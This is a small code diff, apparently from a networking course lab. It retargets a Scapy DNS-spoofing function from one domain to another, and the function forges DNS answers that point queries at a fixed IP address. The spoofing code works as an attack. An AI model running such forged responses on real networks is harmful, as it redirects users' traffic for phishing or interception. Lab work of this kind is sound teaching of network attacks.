@@ -7,9 +7,9 @@ RespIP = "100.0.0.45"
 def DNS_Responder(localIP):
     def getResponse(pkt):
         if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src != RespIP:
-            if "sdncourse.se" in pkt[DNS].qd.qname.decode():
+            if "sdnithub.ru" in pkt[DNS].qd.qname.decode():
                 spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport, sport=53) / \
-                          DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd, an=DNSRR(rrname="sdncourse.se", rdata=RespIP))
+                          DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd, an=DNSRR(rrname="sdnithub.ru", rdata=RespIP))
                 send(spfResp, verbose=0)
                 return "Spoofed DNS Response Sent"
             else:
